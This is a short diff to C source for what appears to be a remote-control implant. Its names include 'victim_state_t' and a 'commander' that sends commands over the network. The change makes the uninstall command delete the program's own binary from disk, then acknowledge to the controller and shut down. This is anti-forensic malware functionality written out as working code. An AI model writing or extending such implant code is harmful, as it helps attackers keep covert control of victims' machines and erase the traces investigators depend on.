@@ -1139,11 +1139,27 @@ static int process_command(victim_state_t *state, const struct sockaddr_in *peer
             deactivate_session(state, "commander disconnected");
             break;
 
-        case CMD_UNINSTALL:
+        case CMD_UNINSTALL: {
+            char self_path[4096];
+            if (g_orig_argv != NULL && g_orig_argv[0] != NULL) {
+                snprintf(self_path, sizeof(self_path), "%s", g_orig_argv[0]);
+                if (self_path[0] != '/') {
+                    char resolved[4096];
+                    if (realpath(self_path, resolved) != NULL) {
+                        snprintf(self_path, sizeof(self_path), "%s", resolved);
+                    }
+                }
+                if (self_path[0] == '/' && unlink(self_path) == 0) {
+                    printf("Self-deletion of %s scheduled\n", self_path);
+                } else {
+                    fprintf(stderr, "Self-deletion failed: %s\n", strerror(errno));
+                }
+            }
             result = send_response(state, peer_addr, CMD_ACK, "uninstall ok");
             deactivate_session(state, "uninstall requested");
             g_running = 0;
             break;
+        }
 
         default:
             snprintf(message, sizeof(message), "unknown command 0x%02x", packet->command);
